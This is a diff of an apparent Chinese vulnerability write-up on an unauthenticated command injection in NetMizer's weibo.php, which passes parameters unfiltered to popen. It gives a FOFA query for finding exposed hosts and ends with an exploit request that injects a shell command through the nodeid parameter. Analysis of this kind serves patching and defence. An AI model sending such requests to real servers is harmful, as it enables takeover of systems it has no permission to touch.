@@ -8,8 +8,6 @@ asset_dir: embedded-base64
 
 NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/search/weibo.php` 文件存在命令执行漏洞。未经身份验证的攻击者可以通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，写入后门程序，获取服务器权限，进而控制整个Web服务器。
 
-微博
-
 # 影响版本
 
 老旧版本
@@ -19,6 +17,14 @@ NetMizer日志管理系统是一款专为网络流量管理和优化设计的日
 > `body="日志管理系统" && body="NetMizer"`
 
 # 漏洞分析
+
+深入探索
+
+客户关系管理
+
+编程
+
+数据管理
 
 看下 `weibo.php` 业务实现关键逻辑部分
 
@@ -71,21 +77,11 @@ NetMizer日志管理系统是一款专为网络流量管理和优化设计的日
        $fp = @popen($cmd,"r");
 ```
 
-深入探索
-
-安全运维服务
-
-Web应用防火墙
-
-安全漏洞扫描工具
-
 当 `$action == 'file'` 时，多个参数如 nodeid、username、qq 这些由用户可控并直接拼接到cmd命令中且无任何过滤和校验，然后使用popen执行，造成[命令注入](https://mrxn.net/tag/rce)漏洞。
 
 # 漏洞复现
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
-
-漏洞扫描服务
 
 ```
 GET /data/search/weibo.php?action=file&nodeid=;sleep+3+%23+ HTTP/1.1
